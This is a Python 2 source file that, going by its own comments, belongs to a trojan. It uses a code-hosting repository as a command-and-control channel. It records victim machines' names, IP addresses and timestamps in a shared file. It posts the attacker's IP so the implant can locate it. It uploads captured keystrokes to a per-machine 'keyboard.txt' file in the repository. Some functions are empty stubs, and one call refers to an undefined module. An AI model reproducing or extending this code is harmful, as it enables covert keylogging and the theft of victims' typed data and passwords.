# -*- coding: utf-8 -*- #
import base64
import socket
import time
import datetime
import wmi 

def getmac(): 
    c = wmi.WMI ()     
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        m = interface.MACAddress 
    return m


#format of stored ip: "name ip date time" 
#search for name and change ip and timestamp
def writeIpAppend(oricon,name,iip,d,t):
	if oricon == None : print "dont have such file\n" ;return;
	orimsg=base64.decodestring(str(oricon.content))	#origin file content
	if orimsg.find(name)==-1 :	# check if the pc is in origin file
		print "add new pc"
		oricon.update("append automatically from py",orimsg+str(name)+" "+iip+" "+d+" "+t+"\n")
	else :	# if have before
		print "update pc"
		newmsg = ""
		orilist = orimsg.split("\n")
		for ilist in orilist :
			if ilist == "" or ilist == " ": continue;
			if ilist.split()[0]==name :
				#print "origin msg : "+ilist
				newmsg += str(name)+" "+iip+" "+d+" "+t+"\n"	# new pc's time update
				continue;
			else :
				newmsg += ilist+"\n"
		oricon.update("update automatically from py",newmsg)

# for trojan to find hacker
def writeIpOfHack(rep):
	# have login before
	# update ip directly
	if rep.contents("ip/hackip.txt") == None :
		print "hack ip initialize"
		rep.create_file("ip/hackip.txt","mumaip.txt automatically from py",LocalIp())
	else:
		con = rep.contents("ip/hackip.txt")
		con.update("update hack's ip automatically from py",LocalIp())


#function to find localIp
def LocalIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 0))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def getLocalTime():
	nowstamp = int(time.time())
	#turn into other format like:"%Y-%m-%d %H:%M:%S"
	timeArray = time.localtime(nowstamp)
	dateTimeFormat = time.strftime("%m/%d", timeArray)
	dayTimeFormat = time.strftime("%H:%M:%S", timeArray)
	return dateTimeFormat,dayTimeFormat


#hack's func to connect to trojan, use mumaip.txt
def getRightIp(oricon):
	nowdate , nowtime = getLocalTime()
	if oricon == None : print "dont have such file\n" ;return;
	else :
		strtime = ""
		trydict = dict()	#initialize
		orimsg = base64.decodestring(str(oricon.content))
		print orimsg
		orilist = orimsg.split("\n")
		print orilist
		print "len of mumaip",len(orilist)
		for ilist in orilist :
			if ilist == "" or ilist == " ": continue;
			if ilist.split()[2]==nowdate :
				print "the same day"
				# can add condition by nowtime within 12 hours
				if int(nowtime.split(":")[0])-int(ilist.split()[3].split(":")[0])<13 :
					print "the same 12 hours"
					trydict[ilist.split()[0]]=ilist.split()[1]
					print ilist.split()[0]+" has been added"
				continue;
		return trydict

#muma get hack ip
def getHackIp(oricon):
	if oricon == None : print "dont have such file\n" ;return;
	orimsg=base64.decodestring(str(oricon.content))
	return orimsg.replace(' ','')


def cacheKeyboard(msg):
	#print into file
	pass

def upKeyboard(rep,msg,pcname):
	if rep.contents("cache/"+pcname+"/keyboard.txt") == None :
	#	print "ip"
		rep.create_file("cache/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
	con = rep.contents("cache/"+pcname+"/keyboard.txt")
	d,t = fileOperation.getLocalTime()
	upFile(con,msg,"upload keyboard "+d+" "+t)
	
def upDir(repo,msg):
	pass


def upFile(oricon,msg,comment):
	if oricon == None : print "dont have such file\n" ;return;
	orimsg=base64.decodestring(str(oricon.content))
	oricon.update(comment,orimsg+msg)